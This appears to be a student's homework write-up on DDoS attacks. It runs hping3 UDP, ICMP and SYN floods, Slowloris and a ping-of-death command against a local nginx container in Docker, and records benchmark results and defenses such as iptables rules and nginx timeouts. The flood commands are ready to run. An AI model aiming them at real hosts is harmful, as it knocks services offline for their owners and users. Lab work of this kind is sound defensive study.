# DDoS attacks - Homework 17

Setup two docker containers:

attacker container - there you need to write scripts that will implement 6 attacks (UDP Flood, ICMP flood, HTTP flood, Slowloris, SYN flood,  Ping of Death)

Defender container - ubuntu & nginx with simple website

Try to implement protection on Defender container

Launch attacker scripts and examine you protection

## How to run

`docker compose up`

This will spin up nginx instance, application on nodejs and a mongodb behind it. It has 1 endpoint: `GET /data` that queries the db and returns the result

## Test results 

We will use the following command to test current nginx availability

```
docker build -t siege . && docker run --rm --network="host" siege -i  -c 10 -t 10s -f ./urls.txt
```


### Without DDoS attacks:



```
Transactions:                   3462 hits
Availability:                 100.00 %
Elapsed time:                   9.27 secs
Data transferred:              16.45 MB
Response time:                  0.03 secs
Transaction rate:             373.46 trans/sec
Throughput:                     1.77 MB/sec
Concurrency:                    9.97
Successful transactions:        3462
Failed transactions:               0
Longest transaction:            0.05
Shortest transaction:           0.02
``` 

### UDP flood 


```
docker run --rm --network=homework_17_private-network utkudarilmaz/hping3:latest --rand-source --flood --udp nginx
```

```
Transactions:                   1087 hits
Availability:                 100.00 %
Elapsed time:                   9.31 secs
Data transferred:               5.16 MB
Response time:                  0.08 secs
Transaction rate:             116.76 trans/sec
Throughput:                     0.55 MB/sec
Concurrency:                    9.61
Successful transactions:        1087
Failed transactions:               0
Longest transaction:            7.15
Shortest transaction:           0.02
```

Udp flood seem to significantly reduce performance.

Possible solution would be to use `iptables` to block UDP traffic or block unneded ports with the firewall, though it can be properly tested in Docker. We can assume that closed all unneded ports and now we try to make a DDoS attack using `host` network:

```
docker run --rm --network=host utkudarilmaz/hping3:latest --rand-source --flood --udp 127.0.0.1 -p 8080
```
```
Transactions:                   3484 hits
Availability:                 100.00 %
Elapsed time:                   9.88 secs
Data transferred:              16.55 MB
Response time:                  0.03 secs
Transaction rate:             352.63 trans/sec
Throughput:                     1.68 MB/sec
Concurrency:                    9.98
Successful transactions:        3484
Failed transactions:               0
Longest transaction:            0.06
Shortest transaction:           0.02
```

### ICMP flood
```
docker run --rm --network=homework_17_private-network utkudarilmaz/hping3:latest --rand-source --flood --icmp nginx -p 8080
```

```
Transactions:                   1201 hits
Availability:                 100.00 %
Elapsed time:                   9.69 secs
Data transferred:               5.71 MB
Response time:                  0.08 secs
Transaction rate:             123.94 trans/sec
Throughput:                     0.59 MB/sec
Concurrency:                    9.71
Successful transactions:        1201
Failed transactions:               0
Longest transaction:            4.11
Shortest transaction:           0.01
```

Same result and same defense approaches can be done as for UDP flood.
We could disable ICMP protocol or apply some rate limits to it

```
possible sollution:

iptables -A INPUT --proto icmp -j DROP
iptables -L -n -v  [List Iptables Rules]
```

### HTTP flood

```
docker run --rm --network=host utkudarilmaz/hping3:latest --rand-source --flood  127.0.0.1 -p 8080
```

```
Transactions:                   3388 hits
Availability:                 100.00 %
Elapsed time:                   9.22 secs
Data transferred:              16.09 MB
Response time:                  0.03 secs
Transaction rate:             367.46 trans/sec
Throughput:                     1.75 MB/sec
Concurrency:                    9.95
Successful transactions:        3388
Failed transactions:               0
Longest transaction:            0.05
Shortest transaction:           0.02
```

This kind of attack does not seem to affect nginx performance locally.

Possible defense solutions:
- Rate limiting requests from single IP
- Limiting number of connections from 1 IP
- Blocking IPs

### Slowloris

```
docker run --rm --network=host aminvakil/slowloris  -s 1024 127.0.0.1 -p 8080
```

```
Transactions:                      0 hits
Availability:                   0.00 %
Elapsed time:                   0.03 secs
Data transferred:               0.00 MB
Response time:                  0.00 secs
Transaction rate:               0.00 trans/sec
Throughput:                     0.00 MB/sec
Concurrency:                    0.00
Successful transactions:           0
Failed transactions:            1033
Longest transaction:            0.00
Shortest transaction:           0.00
```

This attack seem to overwhelm nginx fully, since all 1024 workers are busy.

Possible solution is to limit the time to transfer body/headers

```
client_body_timeout 1s;
client_header_timeout 1s;
```

```
Transactions:                   3282 hits
Availability:                 100.00 %
Elapsed time:                   9.33 secs
Data transferred:              15.59 MB
Response time:                  0.03 secs
Transaction rate:             351.77 trans/sec
Throughput:                     1.67 MB/sec
Concurrency:                    9.96
Successful transactions:        3282
Failed transactions:               0
Longest transaction:            0.06
Shortest transaction:           0.02
```

### SYN flood

```
docker run --rm --network="host" utkudarilmaz/hping3:latest --rand-source --flood -S 127.0.0.1 -p 8080
```

```
Transactions:                   2604 hits
Availability:                 100.00 %
Elapsed time:                   9.11 secs
Data transferred:              12.37 MB
Response time:                  0.03 secs
Transaction rate:             285.84 trans/sec
Throughput:                     1.36 MB/sec
Concurrency:                    9.73
Successful transactions:        2604
Failed transactions:               0
Longest transaction:            1.09
Shortest transaction:           0.02
```

This attack seem to affect nginx moderatly

Possible solutions could be related to rate limiting SYN packets from single IP address:

```
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP
```

### Ping of Death

```
ping -s 65507 nginx
```

Does not seem to work due to being an outdated type of DoS attack